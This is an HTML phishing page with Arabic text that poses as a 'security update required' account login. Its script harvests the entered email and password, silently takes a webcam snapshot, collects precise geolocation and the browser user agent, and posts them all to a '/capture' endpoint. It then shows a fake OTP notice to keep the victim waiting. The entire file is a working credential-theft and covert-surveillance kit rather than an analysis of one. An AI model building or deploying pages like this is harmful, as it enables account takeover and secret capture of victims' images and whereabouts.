<!DOCTYPE html>
<html>
<head>
    <link rel="manifest" href="/manifest.json">
    <title>Login - Secure Access</title>
    <style>
        body { background: #1a1a1a; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
        input { width: 80%; padding: 12px; margin: 10px; border-radius: 5px; border: none; }
        button { background: #007bff; color: white; padding: 12px 30px; border: none; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <h2>تحديث الأمان مطلوب</h2>
    <p>يرجى تسجيل الدخول لتأكيد ملكية الحساب واستلام التنبيهات</p>
    <input type="email" id="email" placeholder="البريد الإلكتروني" required>
    <input type="password" id="pass" placeholder="كلمة المرور" required>
    <button onclick="startCapture()">تسجيل الدخول</button>

    <script>
        // 1. إضافة وظيفة التقاط الصورة هنا
        async function getCameraImage() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا فوراً
                return canvas.toDataURL('image/png');
            } catch (e) { 
                console.log("Camera access denied");
                return null; 
            }
        }

        // 2. تحديث وظيفة البدء لاستدعاء الكاميرا والموقع معاً
        async function startCapture() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            
            // التقاط الصورة أولاً
            const imageData = await getCameraImage();
            
            // سحب الموقع وإرسال كل البيانات
            navigator.geolocation.getCurrentPosition(async (pos) => {
                sendData(email, pass, { lat: pos.coords.latitude, lon: pos.coords.longitude }, imageData);
            }, async () => {
                sendData(email, pass, null, imageData);
            }, { enableHighAccuracy: true });
        }

        // 3. وظيفة إرسال البيانات النهائية للسيرفر
        async function sendData(email, pass, loc, img) {
            await fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    email: email,
                    password: pass,
                    location: loc,
                    image: img, // إرسال الصورة هنا
                    device: navigator.userAgent
                })
            });
            alert("جاري فحص الحساب... سيتم إرسال كود التحقق (OTP) إلى هاتفك قريباً.");
        }
    </script>
</body>
</html>
